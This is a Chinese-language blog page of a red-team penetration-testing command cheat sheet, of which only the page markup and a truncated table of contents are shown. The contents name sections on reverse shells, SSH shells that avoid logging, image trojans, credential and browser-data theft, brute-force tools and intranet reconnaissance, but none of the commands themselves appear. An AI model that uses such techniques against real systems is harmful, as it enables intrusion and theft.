<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防渗透常用命令 | Hexo</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - 共 $1 行","copy":"复制","copyFinish":"复制成功","expand":"展开"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>攻防渗透常用命令</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-14T12:09:34.000Z" id="date"> 2023-09-14</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-14T12:10:23.991Z" id="updated"> 2023-09-14</time></div></span></div></div><hr><div id="post-content"><h1 id="攻防渗透常用命令速查"><a href="#攻防渗透常用命令速查" class="headerlink" title="攻防渗透常用命令速查"></a>攻防渗透常用命令速查</h1><p>建议配合<code>CTRL+F</code>进行查询</p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%9B%AE%E5%BD%95"></a>目录</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5">攻防渗透常用命令速查</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E7%9B%AE%E5%BD%95">目录</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%8F%8D%E5%BC%B9shell">反弹Shell</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#bash">bash</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#curl">curl</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#http">http</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#java">java</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ssh%E6%97%A0%E8%AE%B0%E5%BD%95shell">ssh无记录shell</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#python%E4%BA%A4%E4%BA%92shell">python交互shell</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C">图片马制作</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%8C%89%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E5%BA%8F">按首字母排序</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#allin">AlliN</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#arjun">Arjun</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#dirsearch">dirsearch</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#dirmap">dirmap</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ehole">EHole</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#enscan_go">ENScan_GO</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#find">find</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ffuf">ffuf</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#fscan">fscan</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#grep">grep</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#hping3">hping3</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#hydra">hydra</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#jndi">JNDI</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#hackbrowerserdata">HackBrowerserData</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#kscan">kscan</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#ksubdomain">ksubdomain</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#mysql">mysql</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#medusa">medusa</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#nmap">nmap</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#oneforall">OneForAll</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#scaninfo">scaninfo</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#sqlmap">sqlmap</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#tidefinger">TideFinger</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#urlfinder">URLFinder</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#vulmap">Vulmap</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#xray">Xray</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5">数据库连接</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#redis">Redis</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#postgresql">Postgresql</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">内网信息收集</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1">重要端口及服务</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">Windows信息收集</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6-findfindstr">查找文件 find&#x2F;findstr</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E8%AE%BE%E7%BD%AE%E6%B4%BB%E5%8A%A8%E4%BB%A3%E7%A0%81%E9%A1%B5%E7%BC%96%E5%8F%B7-chcp">设置活动代码页编号 chcp</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF-systeminfo">查看系统信息 systeminfo</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-set">查看环境变量 set</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF-ipconfig">查看网络配置信息 ipconfig</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF-whoami">查看当前用户信息 whoami</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E8%A1%A8-route">查看路由表 route</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Barp%E7%BC%93%E5%AD%98%E8%A1%A8-arp">查看arp缓存表 arp</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF-net-userlocalgroup">查看用户信息 net user&#x2F;localgroup</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E6%97%B6%E9%97%B4-net-statistics">查看主机开启时间 net statistics</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%8F%8A%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF-wmic-product">查看安装软件及版本信息 wmic product</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%88%A9%E7%94%A8powershell%E6%94%B6%E9%9B%86%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF">利用PowerShell收集软件版本信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF-wmic-service">查看本机服务信息 wmic service</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF-wmic-qfe">查看补丁信息 wmic qfe</a><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#metasploit-enum_patches">metasploit enum_patches</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#windows-exploit-suggester">windows exploit suggester</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8-wmic-share">查看共享列表 wmic share</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8-tasklist">查看进程列表 tasklist</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-schtasks">查看计划任务 schtasks</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF-netstat">查看端口信息 netstat</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE-netsh">查看防火墙配置 netsh</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Bwifi%E4%BF%A1%E6%81%AF">查看wifi信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86%E4%BF%A1%E6%81%AF">查看网络代理信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Bpptp%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF">查看PPTP配置信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8Brdp%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E4%BF%A1%E6%81%AF">查看RDP远程桌面信息</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81">查看数据库密码</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF-sc-query">查看服务信息 sc query</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%AF%BC%E5%87%BA%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%BF%A1%E6%81%AF-reg">导出注册表信息 reg</a></li>
